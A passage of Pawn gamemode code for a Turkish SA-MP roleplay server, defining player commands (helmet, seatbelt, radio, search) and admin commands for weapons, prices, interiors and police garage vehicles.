							SendClientMessageEx(playerid,-1, ""C2"[UYUÞTURUCULAR] "C1"Esrar: ["C2"%d"C1"] Amfetamin: ["C2"%d"C1"] Metamfetamin: ["C2"%d"C1"]", Karakter[giveplayerid][uesrar], Karakter[giveplayerid][amfetamin], Karakter[giveplayerid][metamfetamin]);
							SendClientMessageEx(playerid,-1, ""C2"[UYUÞTURUCULAR] "C1"LSD: ["C2"%d"C1"] Extacy: ["C2"%d"C1"] Kokain: ["C2"%d"C1"]", Karakter[giveplayerid][lsd], Karakter[giveplayerid][extacy], Karakter[giveplayerid][kokain]);
							SendClientMessageEx(playerid,-1, ""C2"[UYUÞTURUCULAR] "C1"Eroin: ["C2"%d"C1"] Morfin: ["C2"%d"C1"] MDA: ["C2"%d"C1"]",Karakter[giveplayerid][eroin], Karakter[giveplayerid][morfin], Karakter[giveplayerid][MDA]);
							ShowGuns(playerid, giveplayerid);
							format(string, sizeof(string), "%s'nin üzerinde ellerini gezdirir ve üstünü arar.", OyuncuAdiniBul(giveplayerid));
							MeGonder(playerid, 30.0, string);
						}
					}
					else
					{
					    Hata(playerid, "Kiþi yakýnýnýzda deðil.");
					    return 1;
					}
				}
			}
	        else
	        {
	            Hata(playerid, "Bu oyuncu aktif deðil.");
	            return 1;
	        }
		}
	    return 1;
 	}
 	if(strcmp(string, "/kask", true) == 0)
 	{
		if(IsPlayerInAnyVehicle(playerid))
		{
		    new vehicleid = GetPlayerVehicleID(playerid);
	 		if(GetVehicleModel(vehicleid) == 448
			 || GetVehicleModel(vehicleid) == 461
			 || GetVehicleModel(vehicleid) == 462
			 || GetVehicleModel(vehicleid) == 463
			 || GetVehicleModel(vehicleid) == 468
			 || GetVehicleModel(vehicleid) == 471
			 || GetVehicleModel(vehicleid) == 481
			 || GetVehicleModel(vehicleid) == 509
			 || GetVehicleModel(vehicleid) == 510
			 || GetVehicleModel(vehicleid) == 521
			 || GetVehicleModel(vehicleid) == 522
			 || GetVehicleModel(vehicleid) == 523
			 || GetVehicleModel(vehicleid) == 581
			 || GetVehicleModel(vehicleid) == 586)
			{
				if(AracKemerix[playerid] == 0)
				{
					SetPlayerAttachedObject(playerid,8,18645, 2,0.070000, 0.000000, 0.000000, 88.000000, 75.000000, 0.000000);
				    AracKemerix[playerid] = 1;
					MeGonder(playerid,5.0,"kaskýný takar.");
				}
				else
				{
	   				RemovePlayerAttachedObject(playerid,8);
				    AracKemerix[playerid] = 0;
					MeGonder(playerid,5.0,"kaskýný çýkartýr.");
				}
			}
		}
		else
		{
            if(AracKemerix[playerid] == 1)
			{
	   			RemovePlayerAttachedObject(playerid,8);
			    AracKemerix[playerid] = 0;
				MeGonder(playerid,5.0,"kaskýný çýkartýr.");
			}
		}
		return 1;
	}
	if(strcmp(string, "/ekemeri", true) == 0 || strcmp(string, "/ekemer", true) == 0)
	{
		if(IsPlayerInAnyVehicle(playerid))
		{
		    new vehicleid = GetPlayerVehicleID(playerid);
	 		if(GetVehicleModel(vehicleid) == 448
			 || GetVehicleModel(vehicleid) == 461
			 || GetVehicleModel(vehicleid) == 462
			 || GetVehicleModel(vehicleid) == 463
			 || GetVehicleModel(vehicleid) == 468
			 || GetVehicleModel(vehicleid) == 471
			 || GetVehicleModel(vehicleid) == 481
			 || GetVehicleModel(vehicleid) == 509
			 || GetVehicleModel(vehicleid) == 510
			 || GetVehicleModel(vehicleid) == 521
			 || GetVehicleModel(vehicleid) == 522
			 || GetVehicleModel(vehicleid) == 523
			 || GetVehicleModel(vehicleid) == 581
			 || GetVehicleModel(vehicleid) == 586)
			{
			    return 1;
			}
			if(AracKemeri[playerid] == 0)
			{
			    AracKemeri[playerid] = 1;
				MeGonder(playerid,5.0,"emniyet kemerini takar.");
			}
			else
			{
			    AracKemeri[playerid] = 0;
				MeGonder(playerid,5.0,"emniyet kemerini çýkartýr.");
			}
		}
		return 1;
	}
	if(strcmp(string, "/radyo", true) == 0)
	{
	    if(Karakter[playerid][level] < 5)
	    {
			Hata(playerid, "5 seviye altý oyuncular bu sistemden faydalanamaz.");
	        return 1;
	    }
	    if(!rennieRadyo[playerid])
	    {
	        for(new i=0; i<MAX_PLAYERS; i++)
	        {
	            if(IsPlayerConnected(i))
	            {
	                if(rennieRadyo[i])
	                {
	                    if(IsPlayerInRangeOfPoint(playerid, 30, rennieradyopos[i][0], rennieradyopos[i][1], rennieradyopos[i][2]) && RadyoVirtual[i] == GetPlayerVirtualWorld(playerid))
	                    {
	                        Hata(playerid,"Yakýnlarda baþka bir oyuncu tarafýndan radyo açýlmýþ.");
	                        return 1;
	                    }
	                }
	            }
	        }
	        ShowPlayerDialog(playerid,401,DIALOG_STYLE_LIST,"Radyo","URL\nYoutube","Tamam","Kapat");
	    }
	    else
	    {
	        rennieRadyo[playerid] = 0;
			RadyoVirtual[playerid] = 0;
			Bilgi(playerid, "Radyoyu kaldýrdýnýz!");
	        DestroyDynamicObject(rennieRadyoObject[playerid]);
			DestroyDynamic3DTextLabel(rennieRadyoLabel[playerid]);
			Streamer_Update(playerid);
	        format(rennieRadyoURL[playerid], 256, "");
	        for(new i=0; i<MAX_PLAYERS; i++)
	        {
	            if(IsPlayerConnected(i))
	            {
	                if(RadyoOyuncu[i] == playerid)
	                {
	                    Radyorenniem[i] = 0;
	                    RadyoOyuncu[i] = -1;
	                    StopAudioStreamForPlayer(i);
	                }
	            }
	        }
	    }
	    return 1;
	}

	//yaptým
	if(!strcmp(string, "/silahyer", true))
	{
		if(Karakter[playerid][adminlevel] >= 1 && AKontrol(playerid))
		{
		    string = strtok(cmdtext, idx);
		    if(!strlen(string))
		    {
		        Kullanim(playerid, "/silahyer [fonksiyon]");
		        SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: bilgi, kaldir");
		        return 1;
		    }
		    else if(strcmp(string, "bilgi", true) == 0)
		    {
			    foreach(new gun : GunsGround)
			    {
			        if(IsPlayerInRangeOfPoint(playerid, 5.0, SilahYer[gun][syposx], SilahYer[gun][syposy], SilahYer[gun][syposz]) && SilahYer[gun][syvworld] == GetPlayerVirtualWorld(playerid))
			        {
						format(string, sizeof(string), "Silah ID: %d Silah Mermi Sayýsý: %d Obje ID: %d SQLid: %d", SilahYer[gun][sysilah], SilahYer[gun][symermi], SilahYer[gun][syobject], SilahYer[gun][syid]);
						SendClientMessage(playerid, -1, string);
			            break;
			        }
			    }
		    }
		}
		else
		{
		    Hata(playerid, "Bu komutu kullanabilmek için yeterli yetkiniz yok.");
		    return 1;
		}
		return 1;
	}

	//___________________ADMIN KOMUTLARI________________________________________
	if(strcmp(string, "/givegun", true) == 0)
	{
	    if(Karakter[playerid][adminlevel] >= 6 && Karakter[playerid][aGirdi] == 1)
	    {
			string = strtok(cmdtext, idx);
			if(!strlen(string))
			{
				Kullanim(playerid, "/givegun [oyuncuID] [silah id] [mermi]");
				return 1;
			}
			new playa;
			new gun;
			new ammo;
			playa = ReturnUser(string);
			string = strtok(cmdtext, idx);
			gun = strval(string);
			if(!strlen(string))
			{
				Kullanim(playerid, "/givegun [oyuncuID] [silah id] [mermi]");
				return 1;
			}
			if(gun > 1||gun < 47)
			{
				string = strtok(cmdtext, idx);
				ammo = strval(string);
			    if(IsPlayerConnected(playa))
			    {
			        if(playa != INVALID_PLAYER_ID)
			        {
						OyuncuSilahVer(Karakter[playerid][sqlid], playa, gun, ammo);
						format(string, sizeof(string), "%s(%d) adlý kullanýcýya %d mermili %s verdiniz.", OyuncuAdiniBul(playa), playa, ammo, SilahIsim(gun));
						Bilgi(playerid, string);
						format(string, sizeof(string), "%s(%d) size %d mermili %s verdi.", OyuncuAdiniBul(playerid), playerid, ammo, SilahIsim(gun));
						Bilgi(playa, string);
						format(string, sizeof(string), "[A-GIVEGUN]%s'e %d mermili %s verdi.", OyuncuAdiniBul(playa), ammo, SilahIsim(gun));
						Log(playerid, string);
						format(string, sizeof(string), "[A-GIVEGUN]%s'den %d mermili %s verdi.", OyuncuAdiniBul(playerid), ammo, SilahIsim(gun));
						Log(playa, string);
					}
				}
			}
		}
		return 1;
	}
	if(strcmp(string, "/givegun2", true) == 0)
	{
	    if(Karakter[playerid][adminlevel] >= 6 && Karakter[playerid][aGirdi] == 1)
	    {
			string = strtok(cmdtext, idx);
			if(!strlen(string))
			{
				Kullanim(playerid, "/givegun2 [oyuncuID] [silah id] [mermi]");
				return 1;
			}
			new playa;
			new gun;
			new ammo;
			playa = ReturnUser(string);
			string = strtok(cmdtext, idx);
			gun = strval(string);
			if(!strlen(string))
			{
				Kullanim(playerid, "/givegun [oyuncuID] [silah id] [mermi]");
				return 1;
			}
			if(gun > 1||gun < 47)
			{
				string = strtok(cmdtext, idx);
				ammo = strval(string);
			    if(IsPlayerConnected(playa))
			    {
			        if(playa != INVALID_PLAYER_ID)
			        {
                        GivePlayerWeapon(playa, gun, ammo);
						format(string, sizeof(string), "%s(%d) adlý kullanýcýya %d mermili GEÇÝCÝ %s verdiniz.", OyuncuAdiniBul(playa), playa, ammo, SilahIsim(gun));
						Bilgi(playerid, string);
						format(string, sizeof(string), "%s(%d) size %d mermili GEÇÝCÝ %s verdi.", OyuncuAdiniBul(playerid), playerid, ammo, SilahIsim(gun));
						Bilgi(playa, string);
						format(string, sizeof(string), "[A-GIVEGUN2]%s'e %d mermili GEÇÝCÝ %s verdi.", OyuncuAdiniBul(playa), ammo, SilahIsim(gun));
						Log(playerid, string);
						format(string, sizeof(string), "[A-GIVEGUN2]%s'den %d mermili GEÇÝCÝ %s verdi.", OyuncuAdiniBul(playerid), ammo, SilahIsim(gun));
						Log(playa, string);
					}
				}
			}
		}
		return 1;
	}
	if(strcmp(string, "/agiris", true) == 0)
	{
	    if(Karakter[playerid][aGirdi] == 1) return Hata(playerid, "Yönetim yetkileriniz aktif durumda.");
	    if(Karakter[playerid][adminlevel] >= 1)
	    {
			string = strtok(cmdtext, idx);
			if(!strlen(string))
			{
			    Kullanim(playerid, "/agiris [sifre(harf)]");
			    return 1;
			}
			if(!IsNumeric(string))
			{
			    Hata(playerid, "Þifreniz yalnýzca rakam olabilir, þifrenizi tam olarak öðrenmeden bu komutu kullanmayýn.");
			    return 1;
			}
			new passw = strval(string);
			new SQLSorgusu[512];
		    format(SQLSorgusu, sizeof(SQLSorgusu), "SELECT * FROM `yetkililer` WHERE `isim` = '%d' AND `sifre` = '%d'", Karakter[playerid][sqlid], passw);
		    new Cache:cache = mysql_query(SQLSorgusu, true);
//		    printf(SQLSorgusu);
			if(!cache_get_row_count())
		    {
		        if(denemegiris[playerid] != 0)
		        {
		            return denemegiris[playerid]--;
		        }
			    Bilgi(playerid, "Yönetici þifrenizi yanlýþ girdiðiniz için yetkileriniz sistem tarafýndan alýndý. Karakter þüpheli olarak iþaretlendi.");
			    Karakter[playerid][adminlevel] = 0;
			}
			else
			{
		        Karakter[playerid][aGirdi] = 1;
		        Bilgi(playerid, "Yönetim yetkileriniz aktif edildi.");
				if(Karakter[playerid][adminlevel] < 7) {
			        format(string, sizeof(string), "AdmCmd: %s (%d) yönetim yetkilerini aktif etti.", OyuncuAdiniBul(playerid), playerid);
			        EkibeYolla(COLOR_LIGHTRED, string, 1);
				}
			    return 1;
			}
			cache_delete(cache);
		}
		return 1;
	}
	if(!strcmp(string, "/ickifiyat", true))
	{
	    if(Karakter[playerid][adminlevel] < 4) return Hata(playerid, "Bu komutu kullanabilmek için yeterli yetkiniz yok.");
	    string = strtok(cmdtext, idx);
	    if(isnull(string)) return Hata(playerid, "/ickifiyat [miktar*fiyat]");
	    Veriler[ickifiyat] = strval(string);
	    Bilgi(playerid, "Ýçki fiyatýný düzenlediniz.");
	    return 1;
	}
	if(!strcmp(string, "/yiyecekfiyat", true))
	{
	    if(Karakter[playerid][adminlevel] < 4) return Hata(playerid, "Bu komutu kullanabilmek için yeterli yetkiniz yok.");
	    string = strtok(cmdtext, idx);
	    if(isnull(string)) return Hata(playerid, "/yiyecekfiyat [miktar*fiyat]");
	    Veriler[yiyecekfiyat] = strval(string);
	    Bilgi(playerid, "Yiyecek fiyatýný düzenlediniz.");
	    return 1;
	}
	if(!strcmp(string, "/benzinfiyat", true))
	{
	    if(Karakter[playerid][adminlevel] < 4) return Hata(playerid, "Bu komutu kullanabilmek için yeterli yetkiniz yok.");
	    string = strtok(cmdtext, idx);
	    if(isnull(string)) return Hata(playerid, "/benzinfiyat [miktar*fiyat]");
	    Veriler[benzinfiyat] = strval(string);
	    Bilgi(playerid, "Benzin fiyatýný düzenlediniz.");
	    return 1;
	}
	else if(strcmp(string, "/aip", true) == 0)
	{
		if (Karakter[playerid][adminlevel] >= 2 && Karakter[playerid][aGirdi] == 1)
		{
			string = strtok(cmdtext,idx);
			new playersip[16];
			if(!strlen(string))
			{
  				Kullanim(playerid, "/ip [oyuncuID]");
		        return 1;
			}
 			new giveplayerid = ReturnUser(string);
			GetPlayerIp( giveplayerid,playersip,sizeof(playersip));
 			format(string, sizeof(string), "Oyuncu: %s IP: %s",OyuncuAdiniBul(giveplayerid),playersip);
			SendClientMessage(playerid,COLOR_GRAD2,string);
		}
		return 1;
	}
	if(!strcmp(string, "/izleyenler", true))
	{
	    if(Karakter[playerid][adminlevel] >= 6 && Karakter[playerid][aGirdi] == 1)
	    {
	        for(new i; i<MAX_PLAYERS; i++)
	        {
	            if(gSpectateType[i] != ADMIN_SPEC_TYPE_NONE)
	            {
	                new am[128];
	                format(am, sizeof(am), "%s, %s adlý kullanýcýyý izliyor.", OyuncuAdiniBul(i), OyuncuAdiniBul(gSpectateID[i]));
	                Bilgi(playerid, am);
	            }
	        }
	        return 1;
	    }
	    return 0;
	}
	if(strcmp(string, "/maskeliler", true) == 0)
	{
	    if(Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1)
	    {
	        Bilgi(playerid, "__________Maskeliler__________");
	        for(new i = 0; i < MAX_PLAYERS; i++)
	        {
	            if(IsPlayerConnected(i))
	            {
	                if(Maske[i] == true)
	                {
	                    format(string, sizeof(string), "(ID:%d)%s - Maske ID: %d", i, OyuncuAdiniBul(i), Karakter[i][maskeno]);
	                    SendClientMessage(playerid, -1, string);
					}
				}
			}
		}
		return 1;
	}
	if(strcmp(string, "/radyoacanlar", true) == 0)
	{
		if (Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1)
		{
		    new test2[128];
			SendClientMessage(playerid, COLOR_WHITE, " {FFA275}BÝLGÝ: {FFFFFF}Radyo açanlar");
			for(new i=0; i < MAX_PLAYERS; i++)
		    {
				if(rennieRadyo[i])
				{
			    	format(test2,sizeof(test2),"%s(%d) | SQLID: %d | URL: %s",OyuncuAdiniBul(i),i,Karakter[i][sqlid],rennieRadyoURL[i]);
			    	SendClientMessage(playerid,-1,test2);
			    }
			}
		}
		return 1;
	}
	if(strcmp(string, "/hpallcars", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
		    if(Karakter[playerid][adminlevel] >= 4)
			{
			    new tes3[128];
			    format(tes3, sizeof(tes3), "[!] \"%s\" tarafýndan bütün araçlar tamir edildi.", Karakter[playerid][anick]);
	     		for(new i; i < MAX_PLAYERS; i++)
		       	{
					if(!IsPlayerConnected(i) || IsPlayerNPC(i)) continue;
		       		PlayerPlaySound(i, 1057, 0.0, 0.0, 0.0);
		      		SendClientMessage(i, COLOR_ORANGE, tes3);
				}
		        for(new i;i<MAX_VEHICLES;i++)
				{
					if(IsValidVehicle(i))
					{
						Aractamiri(i);
					}
				}
			}
			return 1;
		}
	}
	if(!strcmp("/intekle", string))
	{
	    if(Karakter[playerid][adminlevel] >= 5 && Karakter[playerid][aGirdi] == 1)
	    {
	        new Float:x, Float:y, Float:z, Float:angle, escape[24], query[1024], isim[24], tur, fiyat;
			string = strtok(cmdtext, idx);
			if(isnull(string)) return Kullanim(playerid, "/intekle [isim(boþluksuz - türkçe karakter içeremez)] [tur] [fiyat]");
			strmid(isim, string, 0, strlen(string), sizeof(isim));
			string = strtok(cmdtext, idx);
			if(isnull(string)) return Kullanim(playerid, "/intekle [isim(boþluksuz - türkçe karakter içeremez)] [tur] [fiyat]");
			tur = strval(string);
			string = strtok(cmdtext, idx);
			if(isnull(string)) return Kullanim(playerid, "/intekle [isim(boþluksuz - türkçe karakter içeremez)] [tur] [fiyat]");
			fiyat = strval(string);

	        GetPlayerPos(playerid, x, y, z);
	        GetPlayerFacingAngle(playerid, angle);
	        mysql_real_escape_string(isim, escape);
	        format(query, sizeof(query), "INSERT INTO `interiors` (`isim`, `x`, `y`, `z`, `angle`, `interior`, `tur`, `fiyat`) VALUES ('%s', '%f', '%f', '%f', '%f', '%d', '%d', '%d')", escape, x, y, z, angle, GetPlayerInterior(playerid), tur, fiyat);
	        new Cache:cache = mysql_query(query, true);
			lastintid++;
	        Interior[lastintid][interiorid] = cache_insert_id();
	        cache_delete(cache);
			strmid(Interior[lastintid][intisim], isim, 0, strlen(isim), 24 );
	        Interior[lastintid][intx] = x;
	        Interior[lastintid][inty] = y;
	        Interior[lastintid][intz] = z;
	        Interior[lastintid][intangle] = angle;
	        Interior[lastintid][intint] = GetPlayerInterior(playerid);
	        Interior[lastintid][inttur] = tur;
	        Interior[lastintid][intfiyat] = fiyat;
	        format(string, sizeof(string), "[Ýsim: %s - Tur: %d - Fiyat: %d] Baþarýyla eklendi.", Interior[lastintid][intisim], Interior[lastintid][inttur], Interior[lastintid][intfiyat]);
	        Bilgi(playerid, string);
	    }
	    return 1;
	}

	if(!strcmp("/intduzelt", string))
	{
		if(Karakter[playerid][adminlevel] >= 5 && Karakter[playerid][aGirdi] == 1)
		{
	        new Float:x, Float:y, Float:z, Float:angle, escape[24], isim[24], tur, fiyat, query[1024];
		    string = strtok(cmdtext, idx);
			if(isnull(string)) return Kullanim(playerid, "/intduzelt [intid] [yeni isim(opsiyonel)] [tur(opsiyonel)] [fiyat(opsiyonel)]");
			new verid = strval(string);
			string = strtok(cmdtext, idx);
			strmid(isim, string, 0, strlen(string), 24);
			string = strtok(cmdtext, idx);
			tur = strval(string);
			string = strtok(cmdtext, idx);
			fiyat = strval(string);

	        GetPlayerPos(playerid, x, y, z);
	        GetPlayerFacingAngle(playerid, angle);
	        if(!isnull(isim)) strmid(Interior[verid][intisim], isim, 0, strlen(isim), 24);
	        if(tur != 0) Interior[verid][inttur] = tur;
	        if(fiyat != 0) Interior[verid][intfiyat] = fiyat;

	        Interior[verid][intx] = x;
	        Interior[verid][inty] = y;
	        Interior[verid][intz] = z;
	        Interior[verid][intangle] = angle;
	        Interior[verid][intint] = GetPlayerInterior(playerid);

	        mysql_real_escape_string(Interior[verid][intisim], escape);
	        format(query, sizeof(query), "UPDATE `interiors` SET `isim` = '%s', `x` = '%f', `y` = '%f', `z` = '%f', `angle` = '%f', `interior` = '%d', `tur` = '%d', `fiyat` = '%d' WHERE id = '%d'", escape, x, y, z, angle, GetPlayerInterior(playerid), Interior[verid][inttur], Interior[verid][intfiyat], Interior[verid][interiorid]);
	        mysql_tquery(1,query);

			format(string, sizeof(string), "[%s(%d)] SQLID: %d X: %f Y: %f Z: %f Angle: %f Interior: %d Tür: %d Fiyat: %d - Baþarýyla düzenlendi.", Interior[verid][intisim], verid, Interior[verid][interiorid], Interior[verid][intx], Interior[verid][inty], Interior[verid][intz], Interior[verid][intangle], Interior[verid][intint], Interior[verid][inttur], Interior[verid][intfiyat]);
			Bilgi(playerid, string);
		}
		return 1;
	}

	if(!strcmp("/intliste", string))
	{
	    if(Karakter[playerid][adminlevel] >= 3 && Karakter[playerid][aGirdi] == 1)
	    {
	        for(new i;i < MAX_INTERIORS; i++)
	        {
	            if(Interior[i][interiorid] != 0)
				{
				    new _mstring[1024];
				    format(_mstring, sizeof(_mstring), "[%s( %d )] SQLID: %d X: %f Y: %f Z: %f Angle: %f Interior: %d Tür: %d Fiyat: %d", Interior[i][intisim], i, Interior[i][interiorid], Interior[i][intx], Interior[i][inty], Interior[i][intz], Interior[i][intangle], Interior[i][intint], Interior[i][inttur], Interior[i][intfiyat]);
					SendClientMessage(playerid, -1, _mstring);
				}
			}
	    }
	    return 1;
	}

	if(!strcmp("/intgit", string))
	{
	    if(Karakter[playerid][adminlevel] >= 3 && Karakter[playerid][aGirdi] == 1)
    	{
			string = strtok(cmdtext, idx);
			new i = strval(string);
			if(isnull(string)) return Kullanim(playerid, "/intgit [intid]");
			SetPlayerPos(playerid, Interior[i][intx],Interior[i][inty],Interior[i][intz]);
			SetPlayerFacingAngle(playerid, Interior[i][intangle]);
			SetPlayerInteriorEx(playerid, Interior[i][intint]);
	    }
	    return 1;
	}

	if(strcmp(string, "/tc", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			if(Karakter[playerid][adminlevel] >= 1 || Karakter[playerid][tester] >= 1)
			{
			    	new lengthdfgy = strlen(cmdtext);
					while ((idx < lengthdfgy) && (cmdtext[idx] <= ' '))
					{
						idx++;
					}
					new offsetdfgy = idx;
					new resultdfgy[128];
					while ((idx < lengthdfgy) && ((idx - offsetdfgy) < (sizeof(resultdfgy) - 1)))
					{
						resultdfgy[idx - offsetdfgy] = cmdtext[idx];
						idx++;
					}
					resultdfgy[idx - offsetdfgy] = EOS;
					if(!strlen(resultdfgy))
					{
						Kullanim(playerid, "/tc [adminlere/test ekibine gidecek olan yazý]");
						return 1;
					}
					new stringmid[256];
					new _ttext[2];
					if(Karakter[playerid][adminlevel] > 0) _ttext = "A";
					if(Karakter[playerid][tester] > 0) _ttext = "H";
					if(strlen(resultdfgy) > 80)
					{
					    strmid(stringmid, resultdfgy, 0, 64, 256);
						format(string, sizeof(string), "[%s] %s: {FFFFFF}%s ...", _ttext, OyuncuAdiniBul(playerid), stringmid);
						EkibeYollaEx(0xADC3E7, string);
						strmid(stringmid, resultdfgy, 64, strlen(resultdfgy), 256);
						format(string, sizeof(string), "[%s] %s: {FFFFFF} ... %s", _ttext, OyuncuAdiniBul(playerid), stringmid);
						EkibeYollaEx(0xADC3E7, string);
					    return 1;
					}
					format(string, sizeof(string), "[%s] %s: "C1"%s", _ttext, OyuncuAdiniBul(playerid), resultdfgy);
					EkibeYollaEx(0xADC3E7, string);
			}
		}
		return 1;
	}
	if(strcmp(string, "/admin", true) == 0 || strcmp(string, "/ac", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			if(Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1)
			{
			    	new lengthdfgy = strlen(cmdtext);
					while ((idx < lengthdfgy) && (cmdtext[idx] <= ' '))
					{
						idx++;
					}
					new offsetdfgy = idx;
					new resultdfgy[128];
					while ((idx < lengthdfgy) && ((idx - offsetdfgy) < (sizeof(resultdfgy) - 1)))
					{
						resultdfgy[idx - offsetdfgy] = cmdtext[idx];
						idx++;
					}
					resultdfgy[idx - offsetdfgy] = EOS;
					if(!strlen(resultdfgy))
					{
						Kullanim(playerid, "/ac [adminlere]");
						return 1;
					}
					new stringmid[256];
					if(strlen(resultdfgy) > 80)
					{
					    strmid(stringmid, resultdfgy, 0, 64, 256);
						format(string, sizeof(string), "[AC] %s: {FFFFFF}%s ...", OyuncuAdiniBul(playerid,1), stringmid);
						EkibeYolla(0xADC3E7, string, 1);
						strmid(stringmid, resultdfgy, 64, strlen(resultdfgy), 256);
						format(string, sizeof(string), "[AC] %s: {FFFFFF} ... %s", OyuncuAdiniBul(playerid,1), stringmid);
						EkibeYolla(0xADC3E7, string, 1);
					    return 1;
					}
					format(string, sizeof(string), "[AC] %s: "C1"%s", OyuncuAdiniBul(playerid,1), resultdfgy);
					EkibeYolla(0xADC3E7, string, 1);
			}
		}
		return 1;
	}
 	if(strcmp(string, "/achat", true) == 0)
	{
		if (Karakter[playerid][adminlevel] >= 6 && Karakter[playerid][aGirdi] == 1)
		{
			if(AdminDuyma[playerid] == 1)
			{
				AdminDuyma[playerid] = 0;
				Bilgi(playerid, "Admin chat kapatýldý.");
			}
			else
			{
				AdminDuyma[playerid] = 1;
				Bilgi(playerid, "Admin chat açýldý.");
			}
		}
		return 1;
	}
	if(strcmp(string, "/aracid", true) == 0)
	{
	    if(Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1)
	    {
			new lengthdfgyx = strlen(cmdtext);
			while ((idx < lengthdfgyx) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offsetdfgyx = idx;
			new resultdfgyx[128];
			while ((idx < lengthdfgyx) && ((idx - offsetdfgyx) < (sizeof(resultdfgyx) - 1)))
			{
				resultdfgyx[idx - offsetdfgyx] = cmdtext[idx];
				idx++;
			}
			resultdfgyx[idx - offsetdfgyx] = EOS;
			if(!strlen(resultdfgyx))
			{
				Kullanim(playerid, "/aracid [araç adý]");
				return 1;
			}
			for(new i = 0; i < 212; i++)
			{
			    if(!isnull(resultdfgyx) && strfind(resultdfgyx, VehicleName[i], true) != -1)
			    {
					format(string, sizeof(string), "Araç adý: %s ID: %d Fiyat: %d$", VehicleName[i], i+400, AracFiyatBul(i+400));
					Bilgi(playerid, string);
				}
			}
		}
		return 1;
	}
	if(strcmp(string, "/apark", true) == 0 || strcmp(string, "/park", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
			new vid = GetPlayerVehicleID(playerid);
			if(Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1)
			{
				GetVehiclePos(vid, Arac[vid][aposx], Arac[vid][aposy], Arac[vid][aposz]);
				GetVehicleZAngle(vid, Arac[vid][aposa]);
    			new Float:x, Float:y, Float:z;
   				GetPlayerPos(playerid, x, y, z);
   				SetPlayerPos(playerid, x, y, z),
				MotoruKapat(vid);
				Arac[vid][ainterior] = GetPlayerInterior(playerid);
				Arac[vid][avworld] = GetPlayerVirtualWorld(playerid);
				format(string, sizeof(string), "~w~ARAC ~g~PARK EDILDI");
				GameTextForPlayer(playerid, string, 2500, 4);
				RemovePlayerFromVehicle(playerid);
				AracKaydet(vid);
			}
	    }
	    return 1;
 	}
	if(strcmp(string, "/amac", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
       	    if(Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1)
			{
			    new allahini = GetPlayerVehicleID(playerid);
		        if(GetMotor(allahini) == 0 && !MotoruAciliyor[allahini])
		        {
					new vid = GetPlayerVehicleID(playerid);
					new engine,lights,alarm,doors,bonnet,boot,objective;
					GetVehicleParamsEx(vid,engine,lights,alarm,doors,bonnet,boot,objective);
					SetVehicleParamsEx(vid,VEHICLE_PARAMS_ON,lights,alarm,doors,bonnet,boot,objective);
		            return 1;
				}
			}
		}
		else Hata(playerid, "Bir aracýn içerisinde deðilsiniz.");
	    return 1;
	}
    if(strcmp(string, "/pnos", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
       	    if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD && Karakter[playerid][isbasi] == 1)
			{
			    if(GetPlayerVirtualWorld(playerid) != 25 && GetPlayerInterior(playerid) != 1) return Hata(playerid, "Bu komutu sadece garajda kullanabilirsiniz.");
			    AracModifiyeleri[Arac[kArac[playerid]][aid]][ModNitro] = 0;
				BilgileriKaydet(kArac[playerid]);
				kArac[playerid] = 0;
			}
		}
		else Hata(playerid, "Bir aracýn içerisinde deðilsiniz.");
	    return 1;
	}
	if(strcmp(string, "/pmac", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
       	    if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD && Karakter[playerid][isbasi] == 1)
			{
			    if(GetPlayerVirtualWorld(playerid) != 25 && GetPlayerInterior(playerid) != 1) return Hata(playerid, "Bu komutu sadece garajda kullanabilirsiniz.");
			    new allahini = GetPlayerVehicleID(playerid);
		        if(GetMotor(allahini) == 0 && !MotoruAciliyor[allahini])
		        {
					new vid = GetPlayerVehicleID(playerid);
					new engine,lights,alarm,doors,bonnet,boot,objective;
					GetVehicleParamsEx(vid,engine,lights,alarm,doors,bonnet,boot,objective);
					SetVehicleParamsEx(vid,VEHICLE_PARAMS_ON,lights,alarm,doors,bonnet,boot,objective);
		            return 1;
				}
			}
		}
		else Hata(playerid, "Bir aracýn içerisinde deðilsiniz.");
	    return 1;
	}
    if(strcmp(string, "/pkilit", true) == 0)
	{
	    if(Birlik[Karakter[playerid][birlik]][ftip] != LSPD && Karakter[playerid][isbasi] != 1)
		{
			return Hata(playerid, "Hatalý bir komut girdiniz.");
		}
	 	if(!IsPlayerInRangeOfPoint(playerid, 5.0, 1584.4128,-1677.3048,5.8966)) return Hata(playerid, "Bu komutu sadece garaj önünde kullanabilirsiniz.");
     	new vid = AracMesafesi(3.0, playerid);
      	if(vid != 0)
       	{
			if(Arac[vid][akilit])
			{
				format(string, sizeof(string), "~g~KILIT ACILDI");
    			GameTextForPlayer(playerid, string, 2000, 4);
				KilitAc(vid);
			}
			else
			{
				format(string, sizeof(string), "~r~KILITLENDI");
				GameTextForPlayer(playerid, string, 2000, 4);
    			KilitKapat(vid);
			}
        }
        else Hata(playerid, "Yakýnýnýzda araç bulunmamaktadýr.");
	    return 1;
	}
	if(strcmp(string, "/ppark", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
			new vid = GetPlayerVehicleID(playerid);
			if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD && Karakter[playerid][isbasi] == 1)
			{
			    if(GetPlayerVirtualWorld(playerid) != 25 && GetPlayerInterior(playerid) != 1) return Hata(playerid, "Bu komutu sadece garajda kullanabilirsiniz.");
				GetVehiclePos(vid, Arac[vid][aposx], Arac[vid][aposy], Arac[vid][aposz]);
				GetVehicleZAngle(vid, Arac[vid][aposa]);
    			new Float:x, Float:y, Float:z;
   				GetPlayerPos(playerid, x, y, z);
